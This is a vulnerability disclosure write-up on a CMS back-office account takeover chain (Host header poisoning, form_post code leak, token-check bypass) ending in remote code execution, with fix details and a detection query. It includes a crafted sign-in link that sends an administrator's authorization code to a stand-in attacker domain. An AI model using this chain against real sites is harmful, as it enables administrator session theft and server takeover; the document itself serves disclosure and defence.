---
title: "Umbraco Back-Office Account Takeover"
vendor: "Umbraco"
product: "Umbraco CMS"
class: "Account takeover (Host header poisoning, OAuth redirect)"
severity: "High"
status: "Disclosed"
date: 2026-10-27
cve: "CVE-2026-117553"
link: "https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-rpv9-qp4c-g469"
summary: "Back-office account takeover that leads to remote code execution. A forged Host header adds an attacker's domain to the back-office sign-in redirect list. A signed-in admin who opens a crafted sign-in link then sends their raw sign-in code to that domain. An HTTP Basic auth header gets the code past the token check. Fixed in 17.7.2 and 18.2.2."
---

## Overview

Three bugs in Umbraco's back-office sign-in combine into a stolen administrator session:

1. **Host header poisoning:** one unauthenticated request with a forged `Host` header permanently adds the attacker's domain to the back-office's list of allowed sign-in redirects.
2. **Unredacted code in `form_post`:** a sign-in link that uses `response_mode=form_post` sends the raw authorization code to that domain.
3. **Token check bypass:** sending the client ID in an HTTP Basic auth header skips the token endpoint's check for raw codes.

The attack needs one click from a signed-in administrator. With the administrator's session, the attacker can then run code on the server through Razor templates.

The bugs affect versions earlier than 17.7.2, and 18.x versions earlier than 18.2.2. To fix them, upgrade to 17.7.2 or 18.2.2.

The full chain works wherever requests for unknown host names reach Umbraco. That includes the following setups:

- Kestrel serving requests directly.
- IIS without host name bindings.
- A reverse proxy that forwards the `Host` header unchanged.

The default project template doesn't set `AllowedHosts`.

We tested a default Umbraco 18.2.0 install (`dotnet new umbraco`, .NET 10, SQLite, Windows). We confirmed each step on the running server and in the source at the `release-18.2.0` tag.

## How the back-office signs in

Umbraco signs back-office users in through OpenIddict, an OAuth 2.0 and OpenID Connect server for ASP.NET Core. The back-office is a public OAuth client named `umbraco-back-office`. It has no client secret.

When a user signs in, Umbraco returns an authorization code to one of the client's allowed redirect URIs. The back-office then exchanges that code for a session token.

## Host header poisoning

`BackOfficeAuthorizationInitializationMiddleware` runs on every back-office request. It builds an origin from the request. If the origin is new, the middleware saves it as an allowed redirect URI for the back-office client:

```csharp
var host = $"{context.Request.Scheme}://{context.Request.Host}";
if (_knownHosts.Contains(host))
{
    return;
}

// ...
var hostsToRegister = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { host };

// ...
await backOfficeApplicationManager.EnsureBackOfficeApplicationAsync(backOfficeHosts);
```

The origin comes from the `Host` header, and nothing checks it. The middleware doesn't require authentication and doesn't compare the host against an allowlist.

So one unauthenticated request to a back-office path with `Host: attacker.example` is enough. Umbraco saves the attacker's domain in the `umbracoOpenIddictApplications` table, where it stays after the request ends. This step needs no account and no victim.

The relevant 18.2.0 source is in the following locations:

- `BackOfficeAuthorizationInitializationMiddleware.cs`: line 74 builds the origin, and line 112 saves it.
- `BackOfficeApplicationManager.cs`: line 293 adds the attacker's callback as an allowed redirect URI.

## Unredacted code in form_post

After sign-in, Umbraco normally redacts the authorization code. It replaces the code with `[redacted]` in the response and keeps the real code in a cookie. But Umbraco only runs this step for the default `query` response mode. With `response_mode=form_post`, the real code goes out unchanged.

The attacker sends a signed-in administrator a sign-in link. The link points at the real site but sets `redirect_uri` to the attacker's domain:

```text
https://TARGET/umbraco/management/api/v1/security/back-office/authorize
  ?client_id=umbraco-back-office
  &response_type=code
  &response_mode=form_post
  &redirect_uri=https%3A%2F%2Fattacker.example%2Fumbraco%2Foauth_complete
  &scope=openid
  &code_challenge=<attacker PKCE challenge>
  &code_challenge_method=S256
  &state=xyz
```

The attack then proceeds as follows:

1. OpenIddict accepts the redirect URI, because the poisoned host is on the allowed list.
2. Sign-in completes without a prompt, because the administrator is already signed in.
3. Umbraco returns a form that submits itself and posts the real code to the attacker's domain.

The attacker supplied the PKCE challenge, so they also hold the matching verifier. On the live server, `form_post` returned the real code, while the default `query` mode returned `[redacted]`.

The relevant 18.2.0 source is in the following locations:

- `HideBackOfficeTokensHandler.cs`, lines 110–129: the redaction step.
- `UmbracoBuilderAuthExtensions.cs`, lines 136–141: the ordering that limits redaction to the `query` response.

## Token check bypass

At the token endpoint, Umbraco rejects raw codes from the back-office client. But the check only works when it can see the client ID. If the client ID isn't set yet, the check returns early and never clears the code.

Umbraco ran this check after OpenIddict read the form body, but before OpenIddict read HTTP Basic credentials. So the attacker leaves `client_id` out of the form body and sends `umbraco-back-office:` in a Basic auth header instead. The check sees no client ID and skips itself. OpenIddict then reads the client ID from the header and completes the exchange.

On the live server, a request with `client_id` in the body got a `400` response. The same request with the client ID in a Basic auth header returned a valid administrator token.

The relevant 18.2.0 source is in the following locations:

- `HideBackOfficeTokensHandler.cs`, lines 132–175: the check, with its early return. The code clear is at line 158.
- `UmbracoBuilderAuthExtensions.cs`, lines 142–147: the ordering that runs the check before Basic auth is read.
- `Constants-OAuthClientIds.cs`, line 13: the public `umbraco-back-office` client ID.

## Code execution through Razor templates

With an administrator session, the attacker can do anything the administrator can do through the Management API. Umbraco templates use Razor, which is C#. In the default `BackofficeDevelopment` runtime mode, Umbraco compiles and runs a template when someone requests a page that uses it.

To run code, the attacker creates a template that contains C#, publishes a page that uses it, and loads the page. We confirmed this end to end. An anonymous page load returned the result of `5*5`, the contents of a file on disk, and the output of `whoami` on the server.

## Fix

Umbraco CMS 17.7.2 and 18.2.2 include the fix, from commit [`490b9b2`](https://github.com/umbraco/Umbraco-CMS/commit/490b9b27dcbb8fb3fe868a36203590968b0569d6). The commit makes the following changes:

- It adds `BackOfficeRedirectUriValidationHandler`. The handler accepts a back-office redirect URI only on the host serving the request or on an explicitly configured host. The same check covers post-logout redirects, and Umbraco ignores redirect URIs saved before the upgrade.
- It rejects any `response_mode` other than `query` for the back-office client.
- It moves the raw-code check after HTTP Basic credential extraction, so the check sees the client ID wherever it was sent.

```csharp
if (clientId is Constants.OAuthClientIds.BackOffice
    && context.Request.ResponseMode.IsNullOrWhiteSpace() is false
    && context.Request.ResponseMode is not OpenIddictConstants.ResponseModes.Query)
{
    context.Reject(
        error: OpenIddictConstants.Errors.InvalidRequest,
        description: "The specified 'response_mode' is not supported.");
}
```

If you can't upgrade yet, limit the host names that reach Umbraco. Set `AllowedHosts` in `appsettings.json` to the site's own host names, or bind the web server or proxy to explicit host names.

To check for tampering, look for unfamiliar hosts in the saved redirect URIs:

```sql
SELECT ClientId, RedirectUris, PostLogoutRedirectUris
FROM umbracoOpenIddictApplications
WHERE ClientId IN ('umbraco-back-office', 'umbraco-swagger')
```

## Disclosure

- **2026-10-05:** Project Umbra reported the issues to Umbraco.
- **2026-10-27:** Umbraco released 17.7.2 and 18.2.2 and published [GHSA-rpv9-qp4c-g469](https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-rpv9-qp4c-g469).
- **2026-10-27:** VulnCheck assigned CVE-2026-117553 (CVSS 4.0: 7.7, CVSS 3.1: 7.5).

The CVE record credits Eu Joe Chegne and Damien Wong of Project Umbra as finders. We rate the full chain Critical, because it ends in remote code execution after one administrator click.
